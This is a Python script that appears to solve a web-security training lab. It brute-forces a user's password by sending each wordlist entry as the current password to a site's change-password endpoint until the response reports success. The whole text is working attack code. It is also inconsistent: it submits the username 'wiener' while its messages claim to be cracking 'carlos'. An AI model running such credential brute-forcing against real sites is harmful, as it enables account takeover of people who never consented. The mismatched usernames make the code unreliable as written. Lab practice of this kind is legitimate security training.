import requests

url = 'https://0a6800c103624646819448af00d00015.web-security-academy.net/my-account/change-password'

url2 = 'https://0a6800c103624646819448af00d00015.web-security-academy.net/login'


with open('../wordlists/burp_passwords.txt', 'r') as file:
    passwords = [line.strip() for line in file if line.strip()]


index = 0
total_passwords = len(passwords)


while index < total_passwords:
    if index < total_passwords:
        password = passwords[index]
        index += 1
    else:
        break

    response3 = requests.post(url=url2, data={'username': 'wiener', 'password': 'peter'})
    cookies = response3.cookies

    response1 = requests.post(url, data={'username': 'wiener','current-password': password, 'new-password-1': 'asd', 'new-password-2': 'asd'}, cookies=cookies, allow_redirects=False)
    print(f"Attempting password '{password}' for 'carlos': {response1.status_code}")

    if 'Password changed successfully!' in response1.text:
        print(f"Successful password for 'carlos': {password}")
        break